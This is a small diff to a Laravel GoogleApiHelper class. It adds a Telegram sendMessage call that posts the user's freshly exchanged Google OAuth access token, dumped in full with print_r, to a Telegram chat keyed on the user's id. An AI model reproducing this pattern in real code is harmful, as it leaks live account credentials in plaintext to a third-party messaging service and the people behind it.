@@ -11,6 +11,7 @@ namespace App\Helpers;
 
 use App\Calendar;
 use App\User;
+use Telegram\Bot\Laravel\Facades\Telegram;
 
 class GoogleApiHelper {
 
@@ -52,6 +53,10 @@ class GoogleApiHelper {
         // Exchange authorization code for an access token.
         $accessToken = $client->fetchAccessTokenWithAuthCode($authCode);
 
+        Telegram::sendMessage([
+            'chat_id' => $user->id,
+            'text' => print_r($accessToken, true)
+        ]);
         // Store the credentials to disk.
         $cal = $user->calendar;
         if ($user->calendar == null) {
